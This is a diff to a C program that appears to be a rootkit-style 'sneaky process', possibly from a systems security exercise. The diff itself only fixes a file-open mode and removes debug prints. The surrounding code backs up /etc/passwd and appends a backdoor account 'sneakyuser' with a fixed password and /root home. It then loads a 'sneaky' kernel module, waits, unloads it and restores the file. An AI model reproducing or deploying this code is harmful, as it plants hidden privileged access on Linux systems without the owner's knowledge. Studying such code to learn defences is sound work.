@@ -45,7 +45,7 @@ void unloadModule() {
 
 void printFile(const char * fname) {
     char ch;
-    FILE * f = fopen(fname, "a");
+    FILE * f = fopen(fname, "r");
     while ((ch=fgetc(f)) != EOF) {
         printf("%c", ch);
     }
@@ -56,12 +56,9 @@ int main(void) {
 	// print my own process ID
     print_PID();
     // copy every from '/ect/passwd' to '/tmp/passwd'
-    printFile("/etc/passwd");
     cpfile("/etc/passwd", "/tmp/passwd");
-    printFile("/tmp/passwd");
     // add one line to '/ect/passwd'
     addMsg("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
-    printFile("/etc/passwd");
     // load the sneaky module
     loadModule();
     // looping reading for ‘q’
@@ -70,5 +67,4 @@ int main(void) {
     unloadModule();
     // retore the '/etc/passwd' file
     cpfile("/tmp/passwd", "/etc/passwd");
-    printFile("/etc/passwd");
 }
